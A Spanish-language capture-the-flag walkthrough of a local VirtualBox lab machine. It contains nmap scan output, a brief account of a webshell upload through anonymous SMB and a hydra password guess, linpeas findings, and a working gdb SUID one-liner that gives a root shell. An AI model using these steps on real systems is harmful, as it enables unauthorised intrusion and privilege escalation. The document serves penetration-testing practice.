Parte de [[Hacking Ético]] y [[Maquinas]]

> Descubrimiento de IP

``` java
   1   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 20:33 CET
   2   │ Nmap scan report for 192.168.56.1
   3   │ Host is up (0.00017s latency).
   4   │ MAC Address: 0A:00:27:00:00:00 (Unknown)
   5   │ Nmap scan report for 192.168.56.10
   6   │ Host is up (0.00022s latency).
   7   │ MAC Address: 08:00:27:9F:BE:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
   8   │ Nmap scan report for 192.168.56.185
   9   │ Host is up (0.00061s latency).
  10   │ MAC Address: 08:00:27:79:F2:B8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  11   │ Nmap scan report for 192.168.56.100
  12   │ Host is up.
  13   │ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.03 seconds
```

>Descubrir puertos abiertos

``` java
# Nmap 7.95 scan initiated Wed Feb 12 20:41:32 2025 as: /usr/lib/nmap/nmap -sS -p- -oN portscan.txt 192.168.56.185
Nmap scan report for 192.168.56.185
Host is up (0.000070s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:79:F2:B8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Wed Feb 12 20:41:34 2025 -- 1 IP address (1 host up) scanned in 2.35 seconds
```

> Descubrir, versiones, scipts OS

``` bash
# Nmap 7.95 scan initiated Wed Feb 12 20:42:54 2025 as: /usr/lib/nmap/nmap -sS -p 22,80,139,445,446 -sC -sV -O -oN nmap_scan.txt 192.168.56.185
Nmap scan report for 192.168.56.185
Host is up (0.00090s latency).

PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open   http        Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open   netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
446/tcp closed ddm-rdb
MAC Address: 08:00:27:79:F2:B8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: ciber1
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: ciber1
|_  System time: 2025-02-12T14:43:07-05:00
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-02-12T19:43:07
|_  start_date: N/A
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 12 20:43:08 2025 -- 1 IP address (1 host up) scanned in 14.05 seconds
```

---

Por smb a share con usuario anonimo podemos subir una webshell lo que nos da acceso a www-data. Con fuzzing web exiftool nos descubre una imagen de Tux que tiene un usuario clemente, con hydra descubrimos su contraseña mustang, lanzo linpeas desde ambos usuarios:

Linpeas nos descubre que:

``` bash
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb
-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent
```

Podemos utilizar gdb para escalar privilegios:

``` bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

Y somos root.

``` java
# uname -r
4.19.0-10-amd64
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt
a7c6ea4931ab86fb54c5400204474a39
```